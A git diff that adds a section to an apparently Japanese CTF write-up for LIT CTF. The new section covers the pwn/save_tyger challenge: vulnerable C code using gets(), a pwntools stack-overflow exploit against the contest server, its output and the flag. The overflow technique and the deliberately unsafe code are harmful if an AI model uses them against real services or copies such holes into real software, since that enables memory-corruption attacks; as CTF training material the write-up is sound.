@@ -1,7 +1,10 @@
 # LIT CTF
 
+https://lit.lhsmathcs.org/
+
 - [misc/kirby!!!](##misc/kirby!!!)
 - [rev/math](##rev/math)
+- [pwn/save_tyger](##pwn/save_tyger)
 
 ## misc/kirby!!!
 
@@ -150,3 +153,75 @@ LITCTF{y0u_must_b3_gr8_@_m4th_i_th0ught_th4t_t3st_was_imp0ss1bl3!}
 ### REF
 
 https://qiita.com/Gyutan/items/7939a723c117c8ebbe5f#struct-%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB
+
+
+## pwn/save_tyger
+### SOLUTIONS
+
+getsによる変数`pass`の書き換えが狙えそうです。
+
+```c
+#include <stdlib.h>
+#include <stdio.h>
+
+char flag[64];
+
+int main(){
+	long pass;
+	char buf[32];
+	pass = 0;
+	printf("Oh no, someone stole our one and only Tyger! :noo:\n");
+	printf("Would you help us save him?\n");
+	gets(buf);
+	if(pass == 0xabadaaab){
+		printf("It worked!\n");
+		FILE *f = fopen("flag.txt", "r");
+		if(f == NULL){
+			printf("Something went wrong. Please let Eggag know.\n");
+			exit(1);
+		}
+		fgets(flag, 64, f);
+		puts(flag);
+	}
+	else printf("WE NEED HIM BAAACK!\n");
+}
+```
+
+リトルエンディアンであることを考慮して、A埋めをするとA40個 + `\xab\xaa\xad\xab`を送ると良さそうです。
+
+```python
+from pwn import *
+
+binfile = "./save_tyger/save_tyger"
+context.binary = binfile
+elf = ELF(binfile)
+conn = remote('litctf.live', 31786)
+
+
+payload = b'a' * 40
+payload += p64(0xabadaaab)
+conn.recvuntil(b'Would you help us save him?\n')
+conn.sendline(payload)
+
+r = conn.interactive()
+print(r)
+```
+
+```bash
+[*] 'save_tyger/save_tyger'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to litctf.live on port 31786: Done
+[*] Switching to interactive mode
+It worked!
+LITCTF{y4yy_y0u_sav3d_0ur_m41n_or94n1z3r}
+```
+
+### FLAG
+
+```
+LITCTF{y4yy_y0u_sav3d_0ur_m41n_or94n1z3r}
+```
